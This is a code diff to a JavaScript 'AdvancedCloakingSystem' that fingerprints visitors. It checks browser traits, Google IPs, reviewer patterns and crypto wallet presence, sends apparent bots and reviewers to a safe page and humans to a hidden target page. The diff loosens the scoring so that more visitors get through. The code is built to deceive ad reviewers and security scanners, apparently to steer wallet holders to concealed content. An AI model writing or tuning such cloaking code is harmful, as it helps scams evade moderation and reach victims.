@@ -4,7 +4,7 @@ class AdvancedCloakingSystem {
         this.config = {
             safePageUrl: config.safePageUrl || '/safe',
             targetPageUrl: config.targetPageUrl || '/target',
-            strictnessLevel: config.strictnessLevel || 60,   // 0-100, higher = more aggressive
+            strictnessLevel: config.strictnessLevel || 55,   // lower = more permissive
             debugMode: config.debugMode || false,
             usePublicIpService: config.usePublicIpService !== undefined ? config.usePublicIpService : true,
             ...config
@@ -29,7 +29,7 @@ class AdvancedCloakingSystem {
         this.fingerprint = null;
         this.walletInfo = null;
 
-        this.log('Cloaking system initialized (battery signal enabled)', 'info');
+        this.log('Cloaking system initialized (less strict mode)', 'info');
     }
 
     // ---------- Bot signature database ----------
@@ -196,7 +196,10 @@ class AdvancedCloakingSystem {
         if (navigator.userAgent.includes('Headless')) indicators.push('headless_ua');
         if (fingerprint.plugins && fingerprint.plugins.length === 0) indicators.push('no_plugins');
         if (fingerprint.canvas && fingerprint.canvas.hash === 'canvas_error') indicators.push('canvas_blocked');
-        if (!window.chrome && !window.navigator.brave) indicators.push('no_chrome');
+        // For non‑Chrome browsers, 'no_chrome' alone is not enough; require at least one other indicator
+        if (!window.chrome && !window.navigator.brave) {
+            if (indicators.length > 0) indicators.push('no_chrome'); // only add if other signs exist
+        }
         return indicators.length >= 2;
     }
 
@@ -394,7 +397,7 @@ class AdvancedCloakingSystem {
                 return {
                     supported: true,
                     charging: battery.charging,
-                    level: battery.level,                // 0..1
+                    level: battery.level,
                     chargingTime: battery.chargingTime,
                     dischargingTime: battery.dischargingTime
                 };
@@ -486,7 +489,7 @@ class AdvancedCloakingSystem {
         return Math.min(50, score);
     }
 
-    // ---------- Weighted scoring (with battery signal) ----------
+    // ---------- Weighted scoring (with battery bonus only, no penalty) ----------
     calculateHumanScore(ipInfo, fingerprint, wallet, behaviorScore) {
         let score = 0;
         const weights = [];
@@ -497,21 +500,16 @@ class AdvancedCloakingSystem {
             weights.push('wallet:+40');
         }
 
-        // ---- Battery presence (new signal) ----
+        // ---- Battery presence (bonus only) ----
         if (fingerprint.battery && fingerprint.battery.supported && typeof fingerprint.battery.level === 'number') {
-            // Valid battery API + level → strong human indicator
-            score += 15;
-            weights.push('battery:+15');
-            // Extra point if charging status is available (almost always if supported)
+            score += 10;
+            weights.push('battery:+10');
             if ('charging' in fingerprint.battery) {
                 score += 2;
                 weights.push('battery_charging:+2');
             }
-        } else {
-            // Lack of battery API is slightly suspicious (but not definitive)
-            score -= 5;
-            weights.push('no_battery:-5');
         }
+        // No penalty for missing battery
 
         // ---- IP signals ----
         if (ipInfo.isGoogle) {
@@ -528,33 +526,33 @@ class AdvancedCloakingSystem {
             }
         }
 
-        // ---- Browser fingerprint ----
+        // ---- Browser fingerprint (softer penalties) ----
         if (fingerprint.plugins && fingerprint.plugins.length > 2) {
-            score += 10;
-            weights.push('plugins>2:+10');
+            score += 8;
+            weights.push('plugins>2:+8');
         } else if (fingerprint.plugins && fingerprint.plugins.length === 0) {
-            score -= 10;
-            weights.push('no_plugins:-10');
+            score -= 5;  // was -10
+            weights.push('no_plugins:-5');
         }
 
         if (fingerprint.fonts && fingerprint.fonts.length > 10) {
-            score += 10;
-            weights.push('fonts>10:+10');
+            score += 8;
+            weights.push('fonts>10:+8');
         } else if (fingerprint.fonts && fingerprint.fonts.length < 5) {
-            score -= 5;
-            weights.push('fonts<5:-5');
+            score -= 3;  // was -5
+            weights.push('fonts<5:-3');
         }
 
         if (fingerprint.canvas && fingerprint.canvas.hash === 'canvas_error') {
-            score -= 15;
-            weights.push('canvas_error:-15');
+            score -= 10;  // was -15
+            weights.push('canvas_error:-10');
         }
 
         if (fingerprint.webgl && fingerprint.webgl.renderer) {
             const renderer = fingerprint.webgl.renderer.toLowerCase();
             if (renderer.includes('swiftshader') || renderer.includes('llvmpipe') || renderer.includes('mesa')) {
-                score -= 20;
-                weights.push('software_renderer:-20');
+                score -= 15;  // was -20
+                weights.push('software_renderer:-15');
             }
         }
 
@@ -565,8 +563,8 @@ class AdvancedCloakingSystem {
 
         const { width, height } = fingerprint.screen;
         if (width < 1024 && height < 768) {
-            score += 10;
-            weights.push('mobile_res:+10');
+            score += 8;  // was 10
+            weights.push('mobile_res:+8');
         }
 
         const isMobile = /Mobi|Android/i.test(navigator.userAgent);
@@ -577,8 +575,8 @@ class AdvancedCloakingSystem {
 
         const langConsistency = this.checkLanguageConsistency();
         if (!langConsistency.consistent) {
-            score -= 10;
-            weights.push('lang/tz_mismatch:-10');
+            score -= 8;  // was -10
+            weights.push('lang/tz_mismatch:-8');
         }
 
         // ---- Behavioral score (max 50) ----
@@ -637,7 +635,7 @@ class AdvancedCloakingSystem {
             return { type: 'reviewer', reason: 'reviewer_pattern', showSafe: true };
         }
 
-        // ---- Weighted score (now includes battery) ----
+        // ---- Weighted score ----
         const humanScore = this.calculateHumanScore(ipCheck, fingerprint, wallet, behaviorScore);
         this.log(`Human score: ${humanScore}% (threshold: ${this.config.strictnessLevel})`, 'info');
 
@@ -695,7 +693,7 @@ class AdvancedCloakingSystem {
     const cloakingSystem = new AdvancedCloakingSystem({
         safePageUrl: '/safe',
         targetPageUrl: '/target',
-        strictnessLevel: 60,          // Adjust based on testing
+        strictnessLevel: 55,          // Lower threshold – more permissive
         debugMode: true,               // Set false in production
         usePublicIpService: true
     });
